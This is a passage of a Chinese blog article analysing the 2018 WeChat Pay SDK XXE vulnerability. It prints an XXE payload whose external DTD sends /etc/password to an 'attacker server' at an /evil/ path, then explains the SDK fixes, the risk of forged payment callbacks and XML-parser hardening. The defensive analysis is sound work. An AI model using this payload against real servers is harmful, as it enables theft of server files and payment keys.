class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f10d845767993-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xxe </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"http://127.0.0.1:9000/xxe.dtd\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f10d845767993-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">xxe</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f10d845767993-6\"><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p>其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67217f11f176564107\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;!ENTITY % shell \"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;\r\n%shell;\r\n%upload;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67217f11f176564107-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f11f176564107-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f11f176564107-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f11f176564107-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67217f11f176564107-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">shell</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f11f176564107-2\"><span class=\"crayon-ta\">%</span><span class=\"crayon-v\">shell</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f11f176564107-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f11f176564107-4\"><span class=\"crayon-o\">%</span><span class=\"crayon-v\">upload</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0117 seconds] -->\r\n<p>通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：</p>\n<p>http://127.0.0.1:9000/evil/password1234</p>\n<p>这样，攻击者便得到了/etc/password文件的内容。</p>\n<p>在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。</p>\n<h1>三、漏洞的解决</h1>\n<p>解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。</p>\n<p>漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/4216f33b379b06b889d166d080606b0a.png\" alt=\"\"></p>\n<p>加入了如下两行代码：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67217f127524718259\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setExpandEntityReferences(false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67217f127524718259-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f127524718259-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67217f127524718259-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f127524718259-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n\n</div>\n<p>更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67217f131456671928\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\ndocumentBuilderFactory.setXIncludeAware(false);\r\ndocumentBuilderFactory.setExpandEntityReferences(false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67217f131456671928-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f131456671928-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f131456671928-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f131456671928-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f131456671928-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f131456671928-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f131456671928-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67217f131456671928-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f131456671928-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-general-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f131456671928-3\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-parameter-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f131456671928-4\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/nonvalidating/load-external-dtd\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f131456671928-5\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f131456671928-6\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setXIncludeAware</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f131456671928-7\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0018 seconds] -->\r\n\n</div>\n<p>此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：</p>\n<p><a href=\"https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5\">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</a></p>\n<p>笔者本人使用上述方案中建议的如下代码修复了该漏洞：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab67217f138844708273\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nDocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();\r\n……</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab67217f138844708273-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f138844708273-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab67217f138844708273-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab67217f138844708273-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab67217f138844708273-1\"><span class=\"crayon-e\">DocumentBuilderFactory </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DocumentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f138844708273-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab67217f138844708273-3\"><span class=\"crayon-e\">DocumentBuilder </span><span class=\"crayon-v\">documentBuilder</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newDocumentBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab67217f138844708273-4\">……</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n\n</div>\n<h1>四、扩展与反思</h1>\n<h2>1.  危害不只是“0元也能买买买”</h2>\n<p>在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。</p>\n<p>然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。</p>\n<h2>2.  漏洞不限于微信支付SDK</h2>\n<p>虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：</p>\n<p>（1）接口使用xml做请求参数</p>\n<p>（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)</p>\n<p>（3）接口中解析xml参数时，没有禁用对外部实体的访问</p>\n<p>建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。</p>\n<h2>3.  xml与json</h2>\n<p>xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。</p>\n<h2>4.  题外话：微信支付的签名认证</h2>\n<p>在前面曾经提到，应用中存储的秘钥一旦泄露，攻击者便可以完全绕过签名认证，这是因为微信支付使用的是对称式的签名认证：微信方和应用方，使用相同的秘钥对相同的明文进行MD5签名，只要应用方的秘钥泄露，签名认证就完全成了摆设。</p>\n<p>在这方面支付宝的做法更规范也更安全：支付宝为应用生成公私钥对，公钥由应用方保存，私钥由支付宝保存；在回调时，支付宝使用私钥进行签名，应用方使用公钥进行验证；这样只要支付宝保存的私钥不泄露，攻击者只有公钥则难以通过签名认证。</p>\n<h1>参考文献</h1>\n<p>https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</p>\n<p><a href=\"http://seclists.org/fulldisclosure/2018/Jul/3\">http://seclists.org/fulldisclosure/2018/Jul/3</a></p>\n<p>https://www.cnblogs.com/tongwen/p/5194483.html</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114197\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114197votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114197\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/9a51fcef743ae4aca8b8c39bcc18e02a01782e9c.jpg"}
